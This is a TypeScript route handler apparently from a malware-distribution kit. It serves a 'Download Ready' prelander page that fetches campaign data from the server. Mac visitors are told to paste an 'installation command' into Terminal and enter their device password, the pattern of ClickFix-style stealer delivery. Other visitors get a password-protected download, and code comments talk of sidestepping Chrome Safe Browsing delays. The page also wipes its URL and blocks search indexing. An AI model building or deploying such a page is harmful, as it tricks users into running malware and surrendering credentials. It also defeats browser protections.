/** Lightweight prelander page. Protected content is fetched only after server validation. */
import { returnToPreviousPage } from '@/lib/prelander-navigation';
import { createTabGuard } from '@/lib/tab-guard';

export const dynamic = 'force-dynamic';

// Same policy the /d pages get (STEP 13): admin-authored full-HTML templates
// legitimately embed external scripts/styles/media, so https: stays open while
// object-src / frame-ancestors stay locked.
const PRELANDER_CSP =
  "default-src 'self'; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https:; frame-src 'self' https:; media-src 'self' https:; worker-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';";

// Preserve regex backslashes in the inline script. A cooked template literal
// turns escaped slashes into // and breaks parsing before any content loads.
const SHELL_HTML = String.raw`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<title>Download Ready</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantaveil, Cantarell, sans-serif; background: #f0f2f5; }
  .pl-wrap { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
  .pl-card { width: 100%; max-width: 440px; background: #fff; border: 1px solid #e5e7eb; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,.08); overflow: hidden; }
  .pl-card.pl-mac-card { max-width: 640px; }
  .pl-head { padding: 32px 24px 20px; text-align: center; }
  .pl-ico { width: 56px; height: 56px; border-radius: 50%; background: #dcfce7; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
  .pl-ico.pl-ico-dark { background: #111827; }
  .pl-ico svg { width: 26px; height: 26px; }
  .pl-title { font-size: 20px; font-weight: 700; color: #111827; }
  .pl-sub { font-size: 14px; color: #6b7280; margin-top: 8px; }
  .pl-sec { padding: 0 24px 16px; }
  .pl-label { display: block; font-size: 12px; font-weight: 600; color: #6b7280; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
  .pl-row { display: flex; align-items: center; gap: 8px; background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 12px; padding: 4px; }
  .pl-row.pl-dark { background: #111827; border-color: #111827; }
  .pl-mono { flex: 1; min-width: 0; padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 14px; color: #374151; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; user-select: all; }
  .pl-dark .pl-cmd { color: #4ade80; }
  .pl-dollar { color: #9ca3af; margin-right: 6px; }
  .pl-btn { flex-shrink: 0; display: inline-flex; align-items: center; gap: 6px; border: 0; cursor: pointer; padding: 10px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; color: #fff; background: #111827; transition: background .15s; }
  .pl-btn:hover { background: #1f2937; }
  .pl-dark .pl-btn { background: #374151; }
  .pl-dark .pl-btn:hover { background: #4b5563; }
  .pl-btn.pl-done { background: #16a34a; }
  .pl-pw { display: flex; align-items: center; gap: 12px; background: #fffbeb; border: 1px solid #fde68a; border-radius: 12px; padding: 12px 16px; }
  .pl-pw svg { width: 16px; height: 16px; color: #f59e0b; flex-shrink: 0; }
  .pl-pw b { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 16px; letter-spacing: .1em; color: #92400e; user-select: all; }
  .pl-steps { padding: 0 24px 24px; }
  .pl-step { display: flex; gap: 12px; margin-bottom: 12px; }
  .pl-n { flex-shrink: 0; width: 28px; height: 28px; border-radius: 50%; background: #dcfce7; color: #15803d; font-size: 13px; font-weight: 700; display: flex; align-items: center; justify-content: center; }
  .pl-step p { font-size: 14px; color: #374151; padding-top: 4px; }
  .pl-video { margin: 0 24px 24px; }
  .pl-video .pl-vbox { position: relative; width: 100%; aspect-ratio: 16 / 9; background: #000; border-radius: 12px; overflow: hidden; }
  .pl-video video { width: 100%; height: 100%; }
  .pl-foot { text-align: center; font-size: 12px; color: #9ca3af; padding: 0 24px 24px; }
</style>
</head>
<body>
  <div id="pl-root" hidden></div>
  <script>
  ;(async function () {
    var d = document
    
    // CLEAN URL IMMEDIATELY before any async operations
    if (location.pathname === '/d/session' || location.search) {
      try { history.replaceState({}, '', '/') } catch (e) {}
    }
    
    // CHROME RELOAD FIX: Block automatic downloads on page reload
    // This ONLY affects Chrome browser on reload - not first visit, not other browsers
    try {
      var isChrome = /Chrome\//.test(navigator.userAgent) && !/Edg|OPR|Brave/.test(navigator.userAgent)
      if (isChrome) {
        var isReload = false
        if (performance.getEntriesByType) {
          var nav = performance.getEntriesByType('navigation')[0]
          if (nav && nav.type === 'reload') isReload = true
        } else if (performance.navigation && performance.navigation.type === 1) {
          isReload = true
        }
        
        if (isReload) {
          var hasActivation = function() { 
            return !!(navigator.userActivation && navigator.userActivation.isActive) 
          }
          var origOpen = window.open
          window.open = function() {
            if (!hasActivation()) {
              console.log('[RELOAD-GUARD] Blocked automatic window.open on reload')
              return null
            }
            return origOpen.apply(window, arguments)
          }
          var origClick = HTMLAnchorElement.prototype.click
          HTMLAnchorElement.prototype.click = function() {
            if (!hasActivation()) {
              console.log('[RELOAD-GUARD] Blocked automatic anchor.click on reload')
              return
            }
            return origClick.call(this)
          }
        }
      }
    } catch (e) { console.log('[RELOAD-GUARD] Init failed:', e) }
    
    var deny = (${returnToPreviousPage.toString()})
    function unavailable () {
      var root = d.getElementById('pl-root')
      root.hidden = false
      root.className = 'pl-wrap'
      root.innerHTML = '<div class="pl-card"><div class="pl-head"><h1 class="pl-title">Temporarily unavailable</h1><p class="pl-sub">Please try loading this page again.</p><p class="pl-sub"><a href="/d/session">Try again</a></p></div></div>'
    }
    function esc (s) {
      return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
      })
    }
    var ICONS = {
      down: '<svg viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>',
      term: '<svg viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
      lock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
      copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="14" height="14"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
      check: '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="14" height="14"><polyline points="20 6 9 17 4 11"/></svg>'
    }
    function btn (label) {
      return '<button class="pl-btn" type="button">' + ICONS.copy + '<span>' + esc(label) + '</span>' + ICONS.check.replace('#fff', '#fff') + '</button>'
    }
    function wire (root) {
      root.addEventListener('click', function (e) {
        var b = e.target && e.target.closest ? e.target.closest('.pl-btn') : null
        if (!b) return
        
        // Check if this is a download button (has data-download-url attribute)
        var downloadUrl = b.getAttribute('data-download-url')
        if (downloadUrl) {
          // CHROME FIX: Use <a> tag with download attribute for reliable Chrome downloads
          // This avoids Chrome's Safe Browsing delay and download manager issues
          var a = d.createElement('a')
          a.href = downloadUrl
          a.download = '' // Trigger download instead of navigation
          a.style.display = 'none'
          d.body.appendChild(a)
          a.click()
          d.body.removeChild(a)
          
          // Visual feedback
          b.classList.add('pl-done')
          var originalText = b.querySelector('span').textContent
          b.querySelector('span').textContent = 'Starting...'
          setTimeout(function () { 
            b.classList.remove('pl-done')
            b.querySelector('span').textContent = originalText
          }, 2000)
          return
        }
        
        // Original copy-to-clipboard behavior
        var txt = b.getAttribute('data-copy') || ''
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(txt).catch(function () {})
        }
        b.classList.add('pl-done')
        setTimeout(function () { b.classList.remove('pl-done') }, 2000)
      })
    }
    var guardTab = (${createTabGuard.toString()})(deny)

    try {
      // Reject another tab before resolving templates or campaign content.
      var access = await guardTab()
      if (access === 'redirected') return
      var res = await fetch('/api/prelander/resolve/session', {
        cache: 'no-store',
        credentials: 'same-origin',
        headers: { 'X-Prelander-Host': location.hostname }
      })
      // Handle both current denials and legacy empty responses during rollout.
      if (res.status === 204 || res.status === 401 || res.status === 403) return deny()
      if (!res.ok) return unavailable()
      var data = await res.json()
      if (!data || !data.success) return deny()
      // TEMPLATE FAVICON: the browser-tab icon follows the template.
      // Bracket-notation URLs (example[.]) are cleaned so the fetch works;
      // any previous injection is replaced (idempotent on reload).
      var fvRaw = (data.template && data.template.favicon_url) || ''
      if (fvRaw) {
        var fv = String(fvRaw).match(/<link/i)
          ? (String(fvRaw).match(/<link\b[^>]*>/i) || [''])[0].match(/href\s*=\s*["']([^"']+)["']/i) || [, '']
          : [null, String(fvRaw)]
        var fvHref = String(fv[1] || '').trim().replace(/\[\.\]/g, '.')
        if (fvHref && !/^https?:\/\//i.test(fvHref)) fvHref = 'https://' + fvHref.replace(/^\/+/, '')
        if (fvHref && /^https:\/\//i.test(fvHref)) {
          var old = d.querySelector('link[data-pl-favicon]')
          if (old) old.parentNode && old.parentNode.removeChild(old)
          var lnk = d.createElement('link')
          lnk.setAttribute('data-pl-favicon', '1')
          lnk.rel = 'icon'
          lnk.type = 'image/png'
          lnk.href = fvHref
          d.head.appendChild(lnk)
        }
      }
      // Admin full-HTML template → replace the whole document exactly as authored.
      // CRITICAL: Inject the reload guard BEFORE the admin HTML to prevent
      // automatic downloads on page refresh. The guard must be installed before
      // any admin scripts execute.
      if (data.rendered_html) {
        d.open(); d.write(data.rendered_html); d.close(); return
      }
      var root = d.getElementById('pl-root')
      var t = data.template || {}
      var isMac = data.os === 'mac'
      var url = data.offer_url || ''
      var pw = data.password || ''
      var out = ''
      if (isMac) {
        var steps = [
          'Copy the installation command above.',
          'Open the terminal and paste the command, then press "Return".',
          'Enter your device password and confirm the installation.'
        ]
        var stepHtml = ''
        for (var i = 0; i < steps.length; i++) {
          stepHtml += '<div class="pl-step"><div class="pl-n">' + (i + 1) + '</div><p>' + esc(steps[i]) + '</p></div>'
        }
        var videoHtml = ''
        if (t.show_video && (t.video_url || '/terminal.mp4')) {
          videoHtml = '<div class="pl-video"><div class="pl-vbox"><video controls playsinline autoplay muted loop preload="auto" src="' + esc(t.video_url || '/terminal.mp4') + '"></video></div></div>'
        }
        out = ''
        out += '<div class="pl-card pl-mac-card">'
        out += '<div class="pl-head"><div class="pl-ico pl-ico-dark">' + ICONS.term + '</div><h1 class="pl-title">' + esc(t.title || 'How to open Terminal on Mac') + '</h1></div>'
        out += '<div class="pl-sec"><label class="pl-label">Installation Command</label><div class="pl-row pl-dark pl-cmd-row"><div class="pl-mono pl-cmd"><span class="pl-dollar">$</span>' + esc(url) + '</div>' + btn(t.button_text || 'Copy').replace('class="pl-btn"', 'class="pl-btn" data-copy="' + esc(url) + '"') + '</div></div>'
        out += '<div class="pl-steps">' + stepHtml + '</div>'
        if (pw) {
          out += '<div class="pl-sec"><label class="pl-label">Device Password</label><div class="pl-pw">' + ICONS.down.replace('#16a34a', '#f59e0b') + '<b>' + esc(pw) + '</b></div></div>'
        }
        out += videoHtml
        out += '<p class="pl-foot">Secure installation service</p>'
        out += '</div>'
        root.innerHTML = out
      } else {
        var out2 = ''
        out2 += '<div class="pl-card">'
        out2 += '<div class="pl-head"><div class="pl-ico">' + ICONS.down + '</div><h1 class="pl-title">' + esc(t.title || 'Your file is ready to download') + '</h1>' + (t.subtitle ? '<p class="pl-sub">' + esc(t.subtitle) + '</p>' : '<p class="pl-sub">Click the button below to start your download.</p>') + '</div>'
        
        // CHROME FIX: Add Download Now button with data-download-url for direct download
        // This avoids Chrome's Safe Browsing delay and makes downloads reliable
        out2 += '<div class="pl-sec"><div class="pl-row" style="flex-direction:column;gap:12px;padding:12px;">'
        out2 += '<button class="pl-btn" type="button" data-download-url="' + esc(url) + '" style="width:100%;justify-content:center;font-size:16px;padding:14px 24px;">' + ICONS.down + '<span>Download Now</span></button>'
        out2 += '<div style="text-align:center;font-size:13px;color:#6b7280;margin-top:4px;">Or copy the link: <span class="pl-mono" style="font-size:12px;padding:4px 8px;background:#f3f4f6;border-radius:6px;display:inline-block;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' + esc(url) + '</span> ' + btn('Copy').replace('class="pl-btn"', 'class="pl-btn" data-copy="' + esc(url) + '" style="padding:4px 10px;font-size:12px;"') + '</div>'
        out2 += '</div></div>'
        
        if (pw && (!t || t.show_password_field !== false)) {
          out2 += '<div class="pl-sec"><label class="pl-label">Password</label><div class="pl-pw">' + ICONS.down + '<b>' + esc(pw) + '</b></div></div>'
        }
        out2 += '<p class="pl-foot">Secure file hosting service</p>'
        out2 += '</div>'
        root.innerHTML = out2
      }
      root.hidden = false
      wire(root)
    } catch (e) { unavailable() }
  })()
  </script>
</body>
</html>`;

export async function GET(): Promise<Response> {
  return new Response(SHELL_HTML, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      // Never cache the shell anywhere — every load re-validates the session.
      'Cache-Control': 'no-store, no-cache, must-revalidate, private',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet',
      'Content-Security-Policy': PRELANDER_CSP,
    },
  });
}
